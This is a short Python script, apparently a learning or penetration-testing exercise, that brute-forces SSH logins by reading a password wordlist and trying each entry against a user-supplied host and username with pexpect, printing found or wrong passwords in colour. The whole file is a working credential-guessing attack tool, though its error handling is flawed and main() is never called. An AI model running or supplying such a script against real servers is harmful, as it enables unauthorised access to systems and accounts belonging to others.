import pexpect
from termcolor import colored

PROMPT = ['# ','>>> ','> ','\$ ']

def connect(user,host,password):
  ssh_newkey = 'Are you sure you wan to continue connecting'
  connStr = 'ssh '+user+'@'+host
  child = pexpect.spawn(connStr)
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword: '])
  if ret == 0:
    print(colored("[!!] Error Connecting ",'red'))
    return
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
    if ret == 0:
      print(colored('[!!] Error Connecting','red'))
      return
  child.sendline(password)
  child.expect(PROMPT,timeout = 0.5)
  return(child)

def main():
  host = input(colored('[?] Enter Host : ','yellow'))
  user = input(colored('[?] Enter Username : ','yellow'))
  filename = input(colored('[?] PassFile Path : ','yellow'))
  file = open(filename,'r')
  for password in file.readlines():
    password =  password.strip('\n')
    try:
      connect(user,host,password)
      print(colored("[+] Password Found : " + password,'green'))
    except :
      print(colored("[-] Wrong Password : " + password,'red'))     